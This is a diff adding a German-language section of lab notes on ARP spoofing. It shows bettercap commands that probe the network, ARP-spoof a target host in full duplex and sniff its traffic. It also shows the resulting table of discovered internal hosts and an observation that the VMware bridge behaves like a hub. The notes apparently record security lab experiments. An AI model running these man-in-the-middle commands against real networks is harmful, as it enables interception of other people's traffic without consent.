@@ -156,5 +156,51 @@ Transmission Control Protocol, Src Port: 43524, Dst Port: 80, Seq: 0, Len: 0
 
 MAC (Attacker) --> MAC (Router)
 
+# Versuche im Labornetz
+
+Bridged
 
 
+
+```
+net.probe on
+net.show
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.100.235
+arp.spoof on
+net.sniff on
+```
+
+```
+┌─────────────────┬───────────────────┬─────────────────┬───────────────────────────────┬────────┬────────┬──────────┐
+│      IP ▴       │        MAC        │      Name       │            Vendor             │  Sent  │ Recvd  │   Seen   │
+├─────────────────┼───────────────────┼─────────────────┼───────────────────────────────┼────────┼────────┼──────────┤
+│ 192.168.100.236 │ 00:0c:29:3b:8d:3e │ eth0            │ VMware, Inc.                  │ 0 B    │ 0 B    │ 05:48:17 │
+│ 192.168.100.254 │ 1c:df:0f:ca:41:01 │ gateway         │ Cisco Systems, Inc            │ 10 kB  │ 0 B    │ 05:48:17 │
+│                 │                   │                 │                               │        │        │          │
+│ 192.168.100.2   │ 00:0c:29:06:d2:5d │                 │ VMware, Inc.                  │ 1.2 kB │ 1.1 kB │ 05:48:52 │
+│ 192.168.100.3   │ 00:0c:29:3e:40:9d │ VHOST-W2K22-ADM │ VMware, Inc.                  │ 796 B  │ 1.3 kB │ 05:48:52 │
+│ 192.168.100.5   │ 00:0c:29:92:75:a4 │                 │ VMware, Inc.                  │ 480 B  │ 368 B  │ 05:48:52 │
+│ 192.168.100.10  │ 00:0c:29:6f:66:49 │ VBACKUP01       │ VMware, Inc.                  │ 796 B  │ 12 kB  │ 05:48:52 │
+│ 192.168.100.11  │ 10:60:4b:af:4a:bc │                 │ Hewlett Packard               │ 0 B    │ 368 B  │ 05:48:30 │
+│ 192.168.100.21  │ 00:0c:29:fa:b2:f2 │ W2K22-1         │ VMware, Inc.                  │ 3.7 kB │ 4.1 kB │ 05:48:52 │
+│ 192.168.100.22  │ 00:0c:29:b1:31:50 │ W2K22-2         │ VMware, Inc.                  │ 868 B  │ 1.4 kB │ 05:48:52 │
+│ 192.168.100.50  │ 9c:8e:99:4c:cb:88 │                 │ Hewlett Packard               │ 480 B  │ 368 B  │ 05:48:52 │
+│ 192.168.100.51  │ bc:24:11:31:0a:70 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:52 │
+│ 192.168.100.71  │ 94:18:82:66:21:d8 │                 │ Hewlett Packard Enterprise    │ 480 B  │ 368 B  │ 05:48:53 │
+│ 192.168.100.75  │ bc:24:11:a5:c3:65 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 473 B  │ 05:48:53 │
+│ 192.168.100.76  │ bc:24:11:6c:8c:c4 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:53 │
+│ 192.168.100.99  │ bc:24:11:c6:5f:6c │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:53 │
+│ 192.168.100.231 │ 60:a4:b7:75:70:0d │                 │ TP-Link Corporation Limited   │ 184 B  │ 583 B  │ 05:48:32 │
+│ 192.168.100.234 │ bc:24:11:90:bb:fc │                 │ Proxmox Server Solutions GmbH │ 90 B   │ 368 B  │ 05:48:32 │
+│ 192.168.100.235 │ 00:0c:29:00:61:1d │                 │ VMware, Inc.                  │ 897 B  │ 716 B  │ 05:48:54 │
+│ 192.168.100.248 │ 00:21:1c:15:16:c1 │                 │ Cisco Systems, Inc            │ 210 B  │ 368 B  │ 05:48:54 │
+│ 192.168.100.249 │ b8:d4:e7:ff:9b:40 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
+│ 192.168.100.250 │ 64:e8:81:78:5a:20 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
+│ 192.168.100.251 │ 64:e8:81:78:88:80 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
+│ 192.168.100.252 │ 64:e8:81:78:48:00 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
+│ 192.168.100.253 │ 00:1d:e6:e3:a9:41 │                 │ Cisco Systems, Inc            │ 210 B  │ 368 B  │ 05:48:54 │
+└─────────────────┴───────────────────┴─────────────────┴───────────────────────────────┴────────┴────────┴──────────┘
+```
+
+Auch in diesem Fall sieht der Attacker alle Pakete auch wenn ARP Spoofing nicht aktiv ist. Wahrscheinlich ist die VmWare Bridge einfach ein Hub.
